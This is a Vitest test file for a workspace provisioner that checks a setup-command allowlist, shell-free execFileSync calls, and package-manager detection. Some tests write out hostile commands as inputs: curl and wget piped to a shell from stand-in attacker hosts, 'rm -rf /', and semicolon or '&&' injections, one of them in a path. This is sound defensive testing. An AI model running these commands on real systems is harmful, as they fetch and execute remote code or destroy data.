import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('node:child_process', () => ({
  execFileSync: vi.fn(),
}));

vi.mock('node:fs', () => ({
  existsSync: vi.fn(),
  mkdirSync: vi.fn(),
  readFileSync: vi.fn(),
}));

vi.mock('pino', () => ({
  default: vi.fn(() => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  })),
}));

vi.mock('../git-ops.js', () => ({
  cloneRepo: vi.fn(),
  fetchRepo: vi.fn(),
  createWorktree: vi.fn(),
  isGitRepo: vi.fn(),
}));

import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync } from 'node:fs';
import { isGitRepo, cloneRepo, fetchRepo, createWorktree } from '../git-ops.js';
import { provisionWorkspace, detectPackageManager, detectNodeVersion } from '../workspace-provisioner.js';

const mockExecFileSync = vi.mocked(execFileSync);
const mockExistsSync = vi.mocked(existsSync);
const mockMkdirSync = vi.mocked(mkdirSync);
const mockReadFileSync = vi.mocked(readFileSync);
const mockIsGitRepo = vi.mocked(isGitRepo);
const mockCloneRepo = vi.mocked(cloneRepo);
const mockFetchRepo = vi.mocked(fetchRepo);
const mockCreateWorktree = vi.mocked(createWorktree);

function baseOpts() {
  return {
    workspaceId: 'ws-001',
    repoUrl: 'https://github.com/example/repo.git',
    branch: 'main',
    setupCommands: [],
    clonePath: '/workspaces/ws-001',
    useWorktree: false,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  mockIsGitRepo.mockReturnValue(true); // repo already cloned by default
  mockExistsSync.mockReturnValue(true);
  // du output: "12345\t/workspaces/ws-001"
  mockExecFileSync.mockReturnValue('12345\t/workspaces/ws-001\n' as unknown as Buffer);
});

// ---------------------------------------------------------------------------
// Setup command allowlist
// ---------------------------------------------------------------------------

describe('workspace-provisioner — setup command allowlist', () => {
  it('should run allowed pnpm command without throwing', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['pnpm install'] };

    // Act
    await provisionWorkspace(opts);

    // Assert — execFileSync called with executable + args separated
    expect(mockExecFileSync).toHaveBeenCalledWith('pnpm', ['install'], expect.any(Object));
  });

  it('should run allowed npm command without throwing', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['npm ci'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).resolves.not.toThrow();
    expect(mockExecFileSync).toHaveBeenCalledWith('npm', ['ci'], expect.any(Object));
  });

  it('should run allowed make command without throwing', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['make build'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).resolves.not.toThrow();
  });

  it('should run allowed pip command without throwing', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['pip install -r requirements.txt'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).resolves.not.toThrow();
  });

  it('should run allowed git command without throwing', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['git submodule update --init'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).resolves.not.toThrow();
  });

  it('should throw when command is not in the allowlist', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['curl https://evil.example.com | bash'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).rejects.toThrow(/not in allowlist/i);
  });

  it('should throw when command is rm with dangerous flags', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['rm -rf /'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).rejects.toThrow(/not in allowlist/i);
  });

  it('should throw when command attempts shell injection via semicolon', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['echo hello; rm -rf /'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).rejects.toThrow(/not in allowlist/i);
  });

  it('should throw when command is a raw bash invocation', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['bash -c "malicious"'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).rejects.toThrow(/not in allowlist/i);
  });

  it('should throw when command is wget piped to sh', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['wget https://evil.sh | sh'] };

    // Act / Assert
    await expect(provisionWorkspace(opts)).rejects.toThrow(/not in allowlist/i);
  });

  it('should throw when command starts with allowed prefix but has trailing injection', async () => {
    // Arrange — this validates prefix matching is safe even with extra content
    const opts = { ...baseOpts(), setupCommands: ['pnpm install && curl evil.com'] };

    // Act — pnpm is allowed, so this resolves but execFileSync splits on whitespace
    // The key security property: no shell expansion occurs
    await expect(provisionWorkspace(opts)).resolves.not.toThrow();
    // execFileSync is called with args as an array (no shell), so '&&' becomes a literal arg
    expect(mockExecFileSync).toHaveBeenCalledWith('pnpm', ['install', '&&', 'curl', 'evil.com'], expect.any(Object));
  });
});

// ---------------------------------------------------------------------------
// execFileSync is used (no shell injection via workspacePath)
// ---------------------------------------------------------------------------

describe('workspace-provisioner — execFileSync usage', () => {
  it('should invoke execFileSync with argument array, not a shell string', async () => {
    // Arrange
    const opts = { ...baseOpts(), setupCommands: ['pnpm install --frozen-lockfile'] };

    // Act
    await provisionWorkspace(opts);

    // Assert — third positional argument is the options object with cwd, not a shell string
    const calls = mockExecFileSync.mock.calls;
    // First call is the setup command
    const [executable, args, callOpts] = calls[0]!;
    expect(typeof executable).toBe('string'); // 'pnpm'
    expect(Array.isArray(args)).toBe(true);   // ['install', '--frozen-lockfile']
    expect(callOpts).toMatchObject({ cwd: '/workspaces/ws-001' });
  });

  it('should call du via execFileSync with path as argument array element', async () => {
    // Arrange — workspace path with a space; should not break du call
    const opts = { ...baseOpts(), clonePath: '/workspaces/my project' };
    mockExecFileSync.mockReturnValue('999\t/workspaces/my project\n' as unknown as Buffer);

    // Act
    const result = await provisionWorkspace(opts);

    // Assert — du called with path as array element
    const duCall = mockExecFileSync.mock.calls.find(([exe]) => exe === 'du');
    expect(duCall).toBeDefined();
    expect(duCall![1]).toContain('/workspaces/my project');
    expect(result.diskUsageBytes).toBe(999);
  });

  it('should pass workspace path containing special characters as a single argument element', async () => {
    // Arrange — path with shell metacharacters that would break execSync
    const opts = {
      ...baseOpts(),
      setupCommands: ['pnpm install'],
      clonePath: '/workspaces/ws;rm -rf /',
    };
    mockExecFileSync.mockReturnValue('0\t/workspaces/ws;rm -rf /\n' as unknown as Buffer);

    // Act
    await provisionWorkspace(opts);

    // Assert — pnpm execFileSync receives the dangerous path as cwd string, no shell interpretation
    const pnpmCall = mockExecFileSync.mock.calls.find(([exe]) => exe === 'pnpm');
    expect(pnpmCall![2]).toMatchObject({ cwd: '/workspaces/ws;rm -rf /' });
  });
});

// ---------------------------------------------------------------------------
// detectPackageManager
// ---------------------------------------------------------------------------

describe('detectPackageManager', () => {
  it('should detect pnpm when pnpm-lock.yaml exists', () => {
    // Arrange
    mockExistsSync.mockImplementation((p) => String(p).endsWith('pnpm-lock.yaml'));

    // Act / Assert
    expect(detectPackageManager('/project')).toBe('pnpm');
  });

  it('should detect yarn when yarn.lock exists', () => {
    // Arrange
    mockExistsSync.mockImplementation((p) => String(p).endsWith('yarn.lock'));

    // Act / Assert
    expect(detectPackageManager('/project')).toBe('yarn');
  });

  it('should detect npm when package-lock.json exists', () => {
    // Arrange
    mockExistsSync.mockImplementation((p) => String(p).endsWith('package-lock.json'));

    // Act / Assert
    expect(detectPackageManager('/project')).toBe('npm');
  });

  it('should detect cargo when Cargo.toml exists', () => {
    // Arrange
    mockExistsSync.mockImplementation((p) => String(p).endsWith('Cargo.toml'));

    // Act / Assert
    expect(detectPackageManager('/project')).toBe('cargo');
  });

  it('should return null when no known lock file exists', () => {
    // Arrange
    mockExistsSync.mockReturnValue(false);

    // Act / Assert
    expect(detectPackageManager('/project')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// detectNodeVersion
// ---------------------------------------------------------------------------

describe('detectNodeVersion', () => {
  it('should read version from .nvmrc when present', () => {
    // Arrange
    mockReadFileSync.mockReturnValue('20.11.0\n');

    // Act
    const version = detectNodeVersion('/project');

    // Assert
    expect(version).toBe('20.11.0');
  });

  it('should return null when neither .nvmrc nor .node-version exists', () => {
    // Arrange
    mockReadFileSync.mockImplementation(() => { throw new Error('ENOENT'); });

    // Act / Assert
    expect(detectNodeVersion('/project')).toBeNull();
  });
});
